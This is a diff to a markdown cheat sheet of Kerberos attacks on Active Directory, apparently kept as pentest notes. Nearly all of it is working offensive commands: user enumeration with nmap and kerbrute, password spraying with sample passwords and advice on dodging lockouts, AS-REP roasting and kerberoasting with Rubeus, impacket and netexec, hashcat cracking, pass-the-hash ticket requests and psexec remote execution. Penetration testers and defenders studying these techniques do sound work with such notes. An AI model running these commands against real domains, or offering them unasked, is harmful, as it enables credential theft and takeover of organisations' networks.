@@ -3,7 +3,6 @@
 ```bash
 nmap -p 88 --script=krb5-enum-users,krb5-realm $IP
 ```
-
 ## Enumerate usernames with kerbrute
 ```bash
 kerbrute userenum -d domain.local --dc $IP /usr/share/wordlists/seclists/Usernames/Names/names.txt
@@ -23,7 +22,6 @@ kerbrute passwordspray -d domain.local --dc $IP users.txt 'Password123!'
 ```
 .\Rubeus.exe asreproast
 ```
-
 
 ## Check for ASREPRoastable users with impacket
 ```bash
@@ -46,17 +44,22 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 # Kerberoasting
-## Request Kerberoast TGS tickets with impacket
+
+## Kerberoast (Rubeus)
+```
+.\Rubeus.exe kerberoast
+```
+##  Kerberoast (impacket)
 ```bash
 impacket-GetUserSPNs domain.local/username:password -dc-ip $IP -request
 ```
 
-## Kerberoast with netexec
+## Kerberoast (netexec)
 ```bash
 netexec ldap $IP -u username -p password --kerberoasting kerberoast_hashes.txt
 ```
 
-## Hashcat Kerberoast
+## Crack TGS from Kerberoast (hashcat)
 ```bash
 hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
@@ -67,12 +70,12 @@ hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 impacket-getTGT domain.local/username -hashes :ntlm_hash
 ```
 
-## Use Kerberos ticket for authentication
+## Set Kerberos ticket for authentication with impacket utilities
 ```bash
 export KRB5CCNAME=username.ccache
 ```
 
-## Execute commands with Kerberos ticket
+## impacket execute commands using a kerberos ticket
 ```bash
 impacket-psexec domain.local/username@target.domain.local -k -no-pass
 ```
@@ -114,9 +117,7 @@ impacket-psexec domain.local/username@target.domain.local -k -no-pass
 - /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 
 ## Password Spraying
-
-**Best practices:**
-- Use one password against many users (not many passwords against one user)
+- Use one password against many users (avoid account lockouts)
 - Common passwords: Password123!, Welcome123!, Summer2024!, CompanyName2024!
 - Monitor for account lockouts
 ## Pass-the-Ticket Attacks
